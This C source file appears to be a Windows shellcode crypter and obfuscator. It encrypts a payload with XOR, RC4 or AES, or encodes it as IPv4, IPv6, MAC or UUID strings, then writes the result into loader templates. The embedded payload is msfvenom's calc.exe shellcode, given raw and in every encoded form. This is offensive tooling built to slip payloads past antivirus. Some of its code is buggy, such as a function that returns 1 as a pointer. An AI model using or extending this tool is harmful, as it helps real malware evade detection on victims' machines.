#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <bcrypt.h>
#include <time.h>

#include "ipv6.h"
#include "xor.h"
#include "rc4.h"
#include "aes.h"
#include "ipv4.h"
#include "mac.h"
#include "uuid.h"

#pragma comment(lib, "bcrypt.lib")

#define _CRT_SECURE_NO_WARNINGS
#ifndef AES256
#define AES256 1
#endif
#define KEYSIZE 32
#define IVSIZE 16

BOOL PaddBuffer(IN PBYTE InputBuffer, IN SIZE_T InputBufferSize, OUT PBYTE* OutputPaddedBuffer, OUT SIZE_T* OutputPaddedSize) {

	PBYTE	PaddedBuffer = 0;
	SIZE_T	PaddedSize = 0;

	// calculate the nearest number that is multiple of 16 and saving it to PaddedSize
	PaddedSize = InputBufferSize + 16 - (InputBufferSize % 16);
	// allocating buffer of size "PaddedSize"
	PaddedBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, PaddedSize);
	if (!PaddedBuffer) {
		return FALSE;
	}
	// cleaning the allocated buffer
	ZeroMemory(PaddedBuffer, PaddedSize);
	// copying old buffer to new padded buffer
	memcpy(PaddedBuffer, InputBuffer, InputBufferSize);
	//saving results :
	*OutputPaddedBuffer = PaddedBuffer;
	*OutputPaddedSize = PaddedSize;

	return TRUE;
}

VOID GenerateRandomBytes(PBYTE pByte, SIZE_T sSize) {

	for (int i = 0; i < sSize; i++) {
		pByte[i] = (BYTE)rand() % 0xFF;
	}

}

VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {

	printf("unsigned char %s[] = {", Name);

	for (int i = 0; i < Size; i++)
	{
		if (i % 16 == 0)
			printf("\n\t");

		if (i < Size - 1)
		{
			printf("0x%0.2X, ", Data[i]);
		}
		else
		{
			printf("0x%0.2X ", Data[i]);
		}
	}
	printf("};\n\n\n");
}

VOID PrintHexDataF(FILE* fp, LPCSTR Name, PBYTE Data, SIZE_T Size) {

	fprintf(fp, "unsigned char %s[] = {", Name);

	for (int i = 0; i < Size; i++)
	{
		if (i % 16 == 0)
			fprintf(fp, "\n\t");

		if (i < Size - 1)
			fprintf(fp, "0x%0.2X, ", Data[i]);
		else
			fprintf(fp, "0x%0.2X ", Data[i]);
	}

	fprintf(fp, "};\n\n\n");
}

VOID GenerateTemplate(LPCSTR TemplateFile, LPCSTR OutputFile, PBYTE Data, SIZE_T Size) {

	FILE* fp = fopen(TemplateFile, "r");

	if (fp == NULL) {
		printf("[-] Failed to open template\n");
		return;
	}

	FILE* out = fopen(OutputFile, "w");

	if (out == NULL) {
		printf("[-] Failed to create output file\n");
		fclose(fp);
		return;
	}

	char line[1024];

	while (fgets(line, sizeof(line), fp))
	{
		if (strstr(line, "{shellcode}") != NULL)
		{
			PrintHexDataF(out, "shellcode", Data, Size);
		}
		else
		{
			fprintf(out, "%s", line);
		}
	}

	fclose(fp);
	fclose(out);

	printf("[+] Generated %s successfully!\n", OutputFile);
}

VOID GenerateTemplate_AES(
	LPCSTR TemplateFile,
	LPCSTR OutputFile,
	PBYTE pKey, SIZE_T sKeySize,
	PBYTE pIv, SIZE_T sIvSize,
	PBYTE CipherText, SIZE_T sCipherSize
) {
	FILE* fp = fopen(TemplateFile, "r");
	FILE* out = fopen(OutputFile, "w");

	if (fp == NULL || out == NULL) {
		printf("[-] Failed to open files\n");
		if (fp) fclose(fp);
		if (out) fclose(out);
		return;
	}

	char line[1024];

	while (fgets(line, sizeof(line), fp))
	{
		if (strstr(line, "{pKey}") != NULL)
			PrintHexDataF(out, "pKey", pKey, sKeySize);

		else if (strstr(line, "{pIv}") != NULL)
			PrintHexDataF(out, "pIv", pIv, sIvSize);

		else if (strstr(line, "{CipherText}") != NULL)
			PrintHexDataF(out, "CipherText", CipherText, sCipherSize);

		else
			fprintf(out, "%s", line);
	}

	fclose(fp);
	fclose(out);

	printf("[+] Generated %s successfully!\n", OutputFile);
}

PBYTE ReadShellcodeFromFile(const char* path, SIZE_T* outSize) {
	HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileA failed: %lu\n", GetLastError());
		return 1;
	}

	SIZE_T size = 0;
	if (!GetFileSizeEx(hFile, &size)) {
		printf("[!] GetFileSizeEx failed: %lu\n", GetLastError());
		CloseHandle(hFile);
		return 1;
	}
	printf("[+] File size: %d bytes\n", size);
	BYTE* pShellcode = (BYTE*)malloc(size);
	DWORD bytesRead = 0;

	if (!ReadFile(hFile, pShellcode, size, &bytesRead, NULL)) {
		printf("[!] ReadFile failed: %lu\n", GetLastError());
		HeapFree(GetProcessHeap(), 0, pShellcode);
		CloseHandle(hFile);
		return 1;
	}
	CloseHandle(hFile);
	printf("[+] Read %lu bytes into 0x%p\n", bytesRead, pShellcode);
	*outSize = (SIZE_T)bytesRead;
	return pShellcode;
}

int main(int argc, char* argv[]) {
	// msfvenom calc.exe 
	unsigned char data_rawdata[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xcd\x64\x9f\x68\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
	unsigned char Shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xcd\x64\x9f\x68\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00";
	char* IPv6Array[18] = {
	"FC48:83E4:F0E8:C000:0000:4151:4150:5251",
		"5648:31D2:6548:8B52:6048:8B52:1848:8B52",
		"2048:8B72:5048:0FB7:4A4A:4D31:C948:31C0",
		"AC3C:617C:022C:2041:C1C9:0D41:01C1:E2ED",
		"5241:5148:8B52:208B:423C:4801:D08B:8088",
		"0000:0048:85C0:7467:4801:D050:8B48:1844",
		"8B40:2049:01D0:E356:48FF:C941:8B34:8848",
		"01D6:4D31:C948:31C0:AC41:C1C9:0D41:01C1",
		"38E0:75F1:4C03:4C24:0845:39D1:75D8:5844",
		"8B40:2449:01D0:6641:8B0C:4844:8B40:1C49",
		"01D0:418B:0488:4801:D041:5841:585E:595A",
		"4158:4159:415A:4883:EC20:4152:FFE0:5841",
		"595A:488B:12E9:57FF:FFFF:5D48:BA01:0000",
		"0000:0000:0048:8D8D:0101:0000:41BA:318B",
		"6F87:FFD5:BBCD:649F:6841:BAA6:95BD:9DFF",
		"D548:83C4:283C:067C:0A80:FBE0:7505:BB47",
		"1372:6F6A:0059:4189:DAFF:D563:616C:632E",
		"6578:6500:0000:0000:0000:0000:0000:0000"
	};
	//const char* path = argv[1];
	const char* path = "C:\\Users\\DELL\\Desktop\\calc.bin";
	SIZE_T sShellcode;
	PBYTE pShellcode = ReadShellcodeFromFile(path, &sShellcode);
	SIZE_T sShellcodeSize = sizeof(data_rawdata);

	char userInput[100];
	printf("Payload Encrytion:\n 1. xor\n 2. rc4 \n 3. aes \n\n Payload Obfuscation \n 4. ipv4 \n 5. ipv6 \n 6. mac \n 7. uuid \n");
	printf("Enter input: ");
	fgets(userInput, sizeof(userInput), stdin);

	if (strcmp(userInput, "1\n") == 0) {
		XorByiKey(pShellcode, sShellcodeSize, 0xd);
		PrintHexData("shellcode", pShellcode, sShellcodeSize);
		XorByiKey(pShellcode, sShellcodeSize, 0xd);
		PrintHexData("shellcode", pShellcode, sShellcodeSize);
		XorByiKey(pShellcode, sShellcodeSize, 0xd);

		GenerateTemplate("C:\\Users\\DELL\\source\\repos\\obfuscrypter\\obfuscrypter\\template_xor.txt", "xor.c", pShellcode, sShellcodeSize);
	}
	else if (strcmp(userInput, "2\n") == 0) {
		typedef struct
		{
			unsigned int i;
			unsigned int j;
			unsigned char s[256];

		} Rc4Context;
		Rc4Context ctx = { 0 };
		unsigned char ciphertext[1000];
		unsigned char plaintext[1000];
		unsigned char key[] = "0xdaemon";
		rc4Init(&ctx, key, strlen(key));
		rc4Cipher(&ctx, data_rawdata, ciphertext, sizeof(data_rawdata));
		PrintHexData("Shellcode", ciphertext, sizeof(ciphertext));
	}
	else if (strcmp(userInput, "3\n") == 0) {
		BYTE pKey[KEYSIZE];                    // KEYSIZE is 32 bytes
		BYTE pIv[IVSIZE];                      // IVSIZE is 16 bytes
		BYTE pIvOriginal[IVSIZE];

		srand(time(NULL));                      // The seed to generate the key. This is used to further randomize the key.
		GenerateRandomBytes(pKey, KEYSIZE);     // Generating a key with the helper function

		srand(time(NULL) ^ pKey[0]);            // The seed to generate the IV. Use the first byte of the key to add more randomness.
		GenerateRandomBytes(pIv, IVSIZE);       // Generating the IV with the helper function

		// Printing both key and IV onto the console 
		PrintHexData("pKey", pKey, KEYSIZE);
		memcpy(pIvOriginal, pIv, IVSIZE);
		PrintHexData("pIv", pIv, IVSIZE);
		PrintHexData("pIvOriginal", pIvOriginal, IVSIZE);


		// Defining two variables the output buffer and its respective size which will be used in SimpleEncryption
		PVOID pCipherText = 0;
		DWORD dwCipherSize = 0;

		// Encrypting
		if (!SimpleEncryption(data_rawdata, sizeof(data_rawdata), pKey, pIv, &pCipherText, &dwCipherSize)) {
			return -1;
		}

		// Print the encrypted buffer as a hex array
		PrintHexData("CipherText", pCipherText, dwCipherSize);
		GenerateTemplate_AES(
			"C:\\Users\\DELL\\source\\repos\\obfuscrypter\\obfuscrypter\\template_aes.txt",
			"aes.c",
			pKey, sizeof(pKey),
			pIvOriginal, sizeof(pIvOriginal),
			pCipherText, dwCipherSize
		);
		printf("after iv and key after writing");
		PrintHexData("pKey", pKey, KEYSIZE);
		PrintHexData("pIv", pIv, IVSIZE);

		// Clean up
		HeapFree(GetProcessHeap(), 0, pCipherText);
		system("PAUSE");
		
		unsigned char pKey1[] = {
		0x90, 0xDE, 0x43, 0x55, 0xD2, 0xF2, 0xB9, 0x1D, 0x3A, 0xB9, 0xA7, 0xC9, 0x0E, 0xF2, 0x21, 0x32,
		0x96, 0x52, 0x55, 0xD7, 0x23, 0x79, 0xB5, 0x74, 0x50, 0x25, 0x59, 0xD6, 0x88, 0xA6, 0x9E, 0xED };


		unsigned char pIv1[] = {
				0x22, 0x71, 0xB0, 0xA2, 0x32, 0x01, 0x06, 0xCC, 0x68, 0x81, 0x5D, 0x84, 0x4C, 0xED, 0x0E, 0xC8 };


		unsigned char CipherText[] = {
				0xE3, 0x1E, 0x21, 0xAC, 0xCE, 0xEC, 0xDB, 0xF6, 0xA7, 0x0D, 0x7C, 0x58, 0xF2, 0x34, 0x5C, 0xD5,
				0x26, 0x2C, 0xCC, 0x18, 0x7D, 0x3C, 0x89, 0xB6, 0x5F, 0x02, 0x3B, 0x54, 0xC0, 0xE7, 0x8E, 0x72,
				0x36, 0xFE, 0x8F, 0x58, 0x21, 0xD4, 0x53, 0xF6, 0x9A, 0xED, 0x03, 0x9E, 0x1B, 0xC0, 0x86, 0x9E,
				0x28, 0xF5, 0x15, 0xDD, 0x3F, 0x11, 0x51, 0xF5, 0xFC, 0x58, 0x39, 0xA9, 0x6D, 0xE7, 0x82, 0x44,
				0x67, 0xCE, 0x2B, 0x45, 0x9C, 0x8C, 0x8D, 0x52, 0x2D, 0x36, 0x11, 0x55, 0xCB, 0x28, 0x5F, 0xB1,
				0x89, 0xB3, 0x58, 0x77, 0xA7, 0xE9, 0xB1, 0x71, 0xC9, 0x76, 0xE8, 0x8A, 0x41, 0xE7, 0x85, 0x14,
				0x24, 0x5D, 0x56, 0xD4, 0xDB, 0xD6, 0x76, 0xA2, 0x10, 0x6B, 0x44, 0x7F, 0xC8, 0xD1, 0x7F, 0x8A,
				0x0E, 0x23, 0x14, 0xF7, 0x02, 0x24, 0x45, 0xF8, 0xB9, 0x4E, 0xBB, 0xD2, 0x12, 0xAE, 0x71, 0x99,
				0xEB, 0xCB, 0x33, 0x04, 0xBE, 0x8A, 0x10, 0x95, 0x02, 0x47, 0x91, 0xDB, 0x9C, 0x6B, 0x60, 0x14,
				0xF3, 0x04, 0x70, 0xD1, 0x20, 0x70, 0x86, 0x61, 0x83, 0x39, 0x63, 0x79, 0xDE, 0xCC, 0xFD, 0xA8,
				0xC0, 0xF3, 0x02, 0x67, 0x92, 0x4A, 0xAD, 0xCD, 0xA7, 0xD0, 0xD0, 0xBC, 0xDA, 0x98, 0xBD, 0x48,
				0x2B, 0xFC, 0x39, 0x58, 0x4E, 0x63, 0xEC, 0xAA, 0x3F, 0xC2, 0x48, 0x8C, 0xC2, 0x8C, 0xAA, 0x67,
				0xC6, 0x3B, 0xC3, 0xCE, 0x0F, 0x6D, 0x84, 0x09, 0x58, 0x56, 0x2F, 0xF8, 0xEC, 0x84, 0x2B, 0xCE,
				0xDE, 0x26, 0x2E, 0x9C, 0x1F, 0xB6, 0x5B, 0x27, 0xB5, 0x0E, 0xFF, 0x8E, 0xE7, 0xD8, 0xCA, 0x72,
				0x95, 0x5A, 0x6B, 0x55, 0x21, 0xA6, 0x11, 0xB6, 0x76, 0xDA, 0xFF, 0xA0, 0x57, 0xA4, 0xD7, 0x5D,
				0xB7, 0xA3, 0xFD, 0x85, 0x41, 0x86, 0x52, 0x8C, 0x7D, 0x83, 0x28, 0x31, 0xF9, 0xBF, 0xCE, 0x8E,
				0x91, 0xC7, 0xCC, 0x38, 0xCF, 0xFF, 0x08, 0x96, 0xD3, 0x3E, 0xB2, 0x49, 0x2F, 0x52, 0xDA, 0x69,
				0x64, 0xF1, 0x4C, 0xE4, 0x11, 0xEA, 0xE9, 0x67, 0x67, 0xCB, 0xD5, 0x57, 0x46, 0xA5, 0x9E, 0x2B };

		PVOID	pPlaintext = 0;
		DWORD	dwPlainSize = 0;
		// Decrypting
		if (!SimpleDecryption(CipherText, sizeof(CipherText), pKey1, pIv1, &pPlaintext, &dwPlainSize)) {
			return -1;
		}

		// Printing the decrypted data to the screen in hex format
		PrintHexData("PlainText", pPlaintext, dwPlainSize);

		// Clean up
		HeapFree(GetProcessHeap(), 0, pPlaintext);
		system("PAUSE");
		return 0;

	}
	else if (strcmp(userInput, "4\n") == 0) {
		size_t origSize = sizeof(data_rawdata);           // 277 (includes trailing \0)
		size_t padSize = (origSize + 3) & ~((size_t)3);  // 280

		unsigned char* padded = (unsigned char*)calloc(padSize, 1);
		if (padded == NULL) {
			printf("[!] calloc failed\n");
			return -1;
		}

		memcpy(padded, data_rawdata, origSize);

		printf("[i] Original shellcode size: %zu bytes\n", origSize);
		printf("[i] Padded size             : %zu bytes\n", padSize);
		printf("[i] Padding added           : %zu byte(s)\n", padSize - origSize);

		if (!GenerateIpv4Output(padded, padSize)) {
			printf("[!] GenerateIpv4Output failed\n");
		}
		char* IPv4Array[70] = {
		"252.72.131.228",
		"240.232.192.0",
		"0.0.65.81",
		"65.80.82.81",
		"86.72.49.210",
		"101.72.139.82",
		"96.72.139.82",
		"24.72.139.82",
		"32.72.139.114",
		"80.72.15.183",
		"74.74.77.49",
		"201.72.49.192",
		"172.60.97.124",
		"2.44.32.65",
		"193.201.13.65",
		"1.193.226.237",
		"82.65.81.72",
		"139.82.32.139",
		"66.60.72.1",
		"208.139.128.136",
		"0.0.0.72",
		"133.192.116.103",
		"72.1.208.80",
		"139.72.24.68",
		"139.64.32.73",
		"1.208.227.86",
		"72.255.201.65",
		"139.52.136.72",
		"1.214.77.49",
		"201.72.49.192",
		"172.65.193.201",
		"13.65.1.193",
		"56.224.117.241",
		"76.3.76.36",
		"8.69.57.209",
		"117.216.88.68",
		"139.64.36.73",
		"1.208.102.65",
		"139.12.72.68",
		"139.64.28.73",
		"1.208.65.139",
		"4.136.72.1",
		"208.65.88.65",
		"88.94.89.90",
		"65.88.65.89",
		"65.90.72.131",
		"236.32.65.82",
		"255.224.88.65",
		"89.90.72.139",
		"18.233.87.255",
		"255.255.93.72",
		"186.1.0.0",
		"0.0.0.0",
		"0.72.141.141",
		"1.1.0.0",
		"65.186.49.139",
		"111.135.255.213",
		"187.205.100.159",
		"104.65.186.166",
		"149.189.157.255",
		"213.72.131.196",
		"40.60.6.124",
		"10.128.251.224",
		"117.5.187.71",
		"19.114.111.106",
		"0.89.65.137",
		"218.255.213.99",
		"97.108.99.46",
		"101.120.101.0",
		"0.0.0.0",
		};
		PBYTE  pIpv4 = NULL;
		SIZE_T sIpv4 = 0;
		printf("ipv4 Deobfuscation:\n");
		if (Ipv4Deobfuscation(IPv4Array,
			sizeof(IPv4Array) / sizeof(IPv4Array[0]),
			&pIpv4, &sIpv4))
		{
			for (SIZE_T i = 0; i < sIpv4; i++)
				printf("%02X ", pIpv4[i]);
			printf("\n");
			HeapFree(GetProcessHeap(), 0, pIpv4);
		}
		return 0;
	}
	else if (strcmp(userInput, "5\n") == 0) {
		printf("IPv6 Output:\n");
		GenerateIpv6Output(Shellcode, sizeof(Shellcode));
		printf("ipv6 Deobfuscation:\n");
		PBYTE  pIpv6 = NULL;
		SIZE_T sIpv6 = 0;
		if (Ipv6Deobfuscation(IPv6Array,
			sizeof(IPv6Array) / sizeof(IPv6Array[0]),
			&pIpv6, &sIpv6))
		{
			for (SIZE_T i = 0; i < sIpv6; i++)
				printf("%02X ", pIpv6[i]);
			printf("\n");
			HeapFree(GetProcessHeap(), 0, pIpv6);
		}

	}
	else if (strcmp(userInput, "6\n") == 0) {
		printf("Mac Output:\n");
		GenerateMacOutput(Shellcode, sizeof(Shellcode));
		char* MacArray[48] = {
		"FC-48-83-E4-F0-E8", "C0-00-00-00-41-51", "41-50-52-51-56-48", "31-D2-65-48-8B-52", "60-48-8B-52-18-48", "8B-52-20-48-8B-72",
		"50-48-0F-B7-4A-4A", "4D-31-C9-48-31-C0", "AC-3C-61-7C-02-2C", "20-41-C1-C9-0D-41", "01-C1-E2-ED-52-41", "51-48-8B-52-20-8B",
		"42-3C-48-01-D0-8B", "80-88-00-00-00-48", "85-C0-74-67-48-01", "D0-50-8B-48-18-44", "8B-40-20-49-01-D0", "E3-56-48-FF-C9-41",
		"8B-34-88-48-01-D6", "4D-31-C9-48-31-C0", "AC-41-C1-C9-0D-41", "01-C1-38-E0-75-F1", "4C-03-4C-24-08-45", "39-D1-75-D8-58-44",
		"8B-40-24-49-01-D0", "66-41-8B-0C-48-44", "8B-40-1C-49-01-D0", "41-8B-04-88-48-01", "D0-41-58-41-58-5E", "59-5A-41-58-41-59",
		"41-5A-48-83-EC-20", "41-52-FF-E0-58-41", "59-5A-48-8B-12-E9", "57-FF-FF-FF-5D-48", "BA-01-00-00-00-00", "00-00-00-48-8D-8D",
		"01-01-00-00-41-BA", "31-8B-6F-87-FF-D5", "BB-CD-64-9F-68-41", "BA-A6-95-BD-9D-FF", "D5-48-83-C4-28-3C", "06-7C-0A-80-FB-E0",
		"75-05-BB-47-13-72", "6F-6A-00-59-41-89", "DA-FF-D5-63-61-6C", "63-2E-65-78-65-00", "00-00-00-00-00-00", "00-00-00-00-00-00"
		};
		PBYTE  ppDAddress = NULL;
		SIZE_T pDSize = 0;
		printf("Mac Deobfuscation:\n");
		if (MacDeobfuscation(MacArray,
			sizeof(MacArray) / sizeof(MacArray[0]),
			&ppDAddress, &pDSize))
		{
			// ---- and the actual payload bytes ----
			printf("[+] Payload        : ");
			for (SIZE_T i = 0; i < pDSize; i++)
				printf("%02X ", ppDAddress[i]);
			printf("\n");

			HeapFree(GetProcessHeap(), 0, ppDAddress);
		}
	}
	else if (strcmp(userInput, "7\n") == 0) {
		printf("UUID output: \n");
		GenerateUuidOutput(Shellcode, sizeof(Shellcode));
		char* UuidArray[18] = {
		"E48348FC-E8F0-00C0-0000-415141505251", "D2314856-4865-528B-6048-8B5218488B52", "728B4820-4850-B70F-4A4A-4D31C94831C0",
		"7C613CAC-2C02-4120-C1C9-0D4101C1E2ED", "48514152-528B-8B20-423C-4801D08B8088", "48000000-C085-6774-4801-D0508B481844",
		"4920408B-D001-56E3-48FF-C9418B348848", "314DD601-48C9-C031-AC41-C1C90D4101C1", "F175E038-034C-244C-0845-39D175D85844",
		"4924408B-D001-4166-8B0C-48448B401C49", "8B41D001-8804-0148-D041-5841585E595A", "59415841-5A41-8348-EC20-4152FFE05841",
		"8B485A59-E912-FF57-FFFF-5D48BA010000", "00000000-4800-8D8D-0101-000041BA318B", "D5FF876F-CDBB-9F64-6841-BAA695BD9DFF",
		"C48348D5-3C28-7C06-0A80-FBE07505BB47", "6A6F7213-5900-8941-DAFF-D563616C632E", "00657865-0000-0000-0000-000000000000"
		};
		printf("UUID deobfuscation: \n");
		PBYTE  ppDAddress1 = NULL;
		SIZE_T pDSize1 = 0;
		UuidDeobfuscation(UuidArray, sizeof(UuidArray) / sizeof(UuidArray[0]), &ppDAddress1, &pDSize1);
		for (SIZE_T i = 0; i < pDSize1; i++)
			printf("%02X ", ppDAddress1[i]);
		printf("\n");

	}
	else {
		printf("unknown option");
	}
	return 0;		
}